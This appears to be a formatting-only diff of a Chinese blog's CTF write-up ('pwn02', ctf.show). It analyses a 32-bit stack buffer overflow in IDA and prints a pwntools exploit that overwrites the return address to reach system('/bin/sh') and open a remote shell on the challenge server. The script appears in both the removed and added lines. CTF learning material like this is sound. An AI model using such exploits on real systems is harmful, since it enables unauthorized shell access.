@@ -19,12 +19,12 @@
   <meta name="author" content="野草">
   <meta name="keywords" content="野草">
   
-    <meta name="description" content="下载文件，逆向一下，打开IDA,tab编译。 我们可以注意到有一个pwnme函数，打开看看。 查看v1数据 不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。 s下面有一个r,这个r就是ret。  CALL，RET和LEAVE CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后">
+    <meta name="description" content="下载文件，逆向一下，打开IDA,tab编译。  我们可以注意到有一个pwnme函数，打开看看。  查看v1数据  不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。 s下面有一个r,这个r就是ret。  CALL，RET和LEAVE CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP">
 <meta property="og:type" content="website">
 <meta property="og:title" content="pwn02">
 <meta property="og:url" content="https://ycqaq233.github.io/WriteUp/PWN/pwn02.html">
 <meta property="og:site_name" content="野草">
-<meta property="og:description" content="下载文件，逆向一下，打开IDA,tab编译。 我们可以注意到有一个pwnme函数，打开看看。 查看v1数据 不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。 s下面有一个r,这个r就是ret。  CALL，RET和LEAVE CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后">
+<meta property="og:description" content="下载文件，逆向一下，打开IDA,tab编译。  我们可以注意到有一个pwnme函数，打开看看。  查看v1数据  不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。 s下面有一个r,这个r就是ret。  CALL，RET和LEAVE CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/pwn02-1.png">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/pwn02-2.png">
@@ -231,26 +231,26 @@
                 
 
 <article class="page-content">
-  <p>下载文件，逆向一下，打开IDA,tab编译。<img src="img/pwn02-1.png" srcset="/img/loading.gif" lazyload alt><br>
-我们可以注意到有一个pwnme函数，打开看看。<img src="img/pwn02-2.png" srcset="/img/loading.gif" lazyload alt><br>
-查看v1数据<img src="img/pwn02-3.png" srcset="/img/loading.gif" lazyload alt><br>
-不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。<br>
+  <p>下载文件，逆向一下，打开IDA,tab编译。 <img src="img/pwn02-1.png" srcset="/img/loading.gif" lazyload>
+我们可以注意到有一个pwnme函数，打开看看。 <img src="img/pwn02-2.png" srcset="/img/loading.gif" lazyload>
+查看v1数据 <img src="img/pwn02-3.png" srcset="/img/loading.gif" lazyload>
+不知道为什么跟网上的不一样，不过意思是一样的，就是v1只有9个字节大小。但是fgets读入了50个字符，可以利用这个构造栈溢出漏洞。
 s下面有一个r,这个r就是ret。</p>
 <blockquote>
-<p>CALL，RET和LEAVE<br>
-CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。执行push和jump指令。<br>
-RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。<br>
+<p>CALL，RET和LEAVE
+CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。执行push和jump指令。
+RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。
 LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。</p>
 </blockquote>
-<p>我们可以填充9个字节占满v1,再填充4个字节的地址覆盖ret，让其跳转到我们想要的地方。<br>
-shift+f12查看字符数据。<img src="img/pwn02-4.png" srcset="/img/loading.gif" lazyload alt><br>
-这个服务器应该是Linux架构，Linux的/bin是一个存储了很多可执行文件的目录。比如cat,mv,date等。双击<code>/bin/sh</code>跳转。<img src="img/pwn02-5.png" srcset="/img/loading.gif" lazyload alt><br>
-双击右边的<code>stack+9↑o</code>跳转。<img src="img/pwn02-6.png" srcset="/img/loading.gif" lazyload alt><br>
-看到<code>stack</code>函数调用了<code>system(&quot;/bin/sh&quot;)</code>,我们要跳转的就是这里。<img src="img/pwn02-7.png" srcset="/img/loading.gif" lazyload alt><br>
-接下来就是写exp了。打开kali，使用python3编写。代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <span class="hljs-comment">#引入pwn包所有函数</span><br>content = <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> content == <span class="hljs-number">0</span>:<br>        p = process(<span class="hljs-string">&quot;./stack&quot;</span>)<span class="hljs-comment">#这是连接本地文件，其实在这里没什么用不写也可以因为根本就不会执行</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28040</span>)<span class="hljs-comment">#建立一个远程连接需要相应URL/IP和port当然这就是在前面创建的容器（服务器）信息，将remote对象保存至变量p中</span><br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">13</span><span class="hljs-comment">#数据打包，由于前文提到的在s处填入9+4个字节</span><br>        payload += p32(<span class="hljs-number">0x804850F</span>)<span class="hljs-comment">#同上，p32()将整数值转为32位打包</span><br>        p.send(payload)<span class="hljs-comment">#调用对象p的方法，send()将shellcode送至服务器端</span><br>        p.interactive()<span class="hljs-comment">#将控制权交给用户可使用打开的shell</span><br>main()<br></code></pre></td></tr></table></figure>
-<p><img src="img/pwn02-8.png" srcset="/img/loading.gif" lazyload alt><br>
-得到flag。</p>
+<p>我们可以填充9个字节占满v1,再填充4个字节的地址覆盖ret，让其跳转到我们想要的地方。
+shift+f12查看字符数据。 <img src="img/pwn02-4.png" srcset="/img/loading.gif" lazyload>
+这个服务器应该是Linux架构，Linux的/bin是一个存储了很多可执行文件的目录。比如cat,mv,date等。
+双击<code>/bin/sh</code>跳转。 <img src="img/pwn02-5.png" srcset="/img/loading.gif" lazyload>
+双击右边的<code>stack+9↑o</code>跳转。 <img src="img/pwn02-6.png" srcset="/img/loading.gif" lazyload>
+看到<code>stack</code>函数调用了<code>system("/bin/sh")</code>,我们要跳转的就是这里。
+<img src="img/pwn02-7.png" srcset="/img/loading.gif" lazyload>
+接下来就是写exp了。打开kali，使用python3编写。代码如下 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <span class="hljs-comment">#引入pwn包所有函数</span><br>content = <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> content == <span class="hljs-number">0</span>:<br>        p = process(<span class="hljs-string">&quot;./stack&quot;</span>)<span class="hljs-comment">#这是连接本地文件，其实在这里没什么用不写也可以因为根本就不会执行</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28040</span>)<span class="hljs-comment">#建立一个远程连接需要相应URL/IP和port当然这就是在前面创建的容器（服务器）信息，将remote对象保存至变量p中</span><br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">13</span><span class="hljs-comment">#数据打包，由于前文提到的在s处填入9+4个字节</span><br>        payload += p32(<span class="hljs-number">0x804850F</span>)<span class="hljs-comment">#同上，p32()将整数值转为32位打包</span><br>        p.send(payload)<span class="hljs-comment">#调用对象p的方法，send()将shellcode送至服务器端</span><br>        p.interactive()<span class="hljs-comment">#将控制权交给用户可使用打开的shell</span><br>main()<br></code></pre></td></tr></table></figure>
+<img src="img/pwn02-8.png" srcset="/img/loading.gif" lazyload> 得到flag。</p>
 
 
   
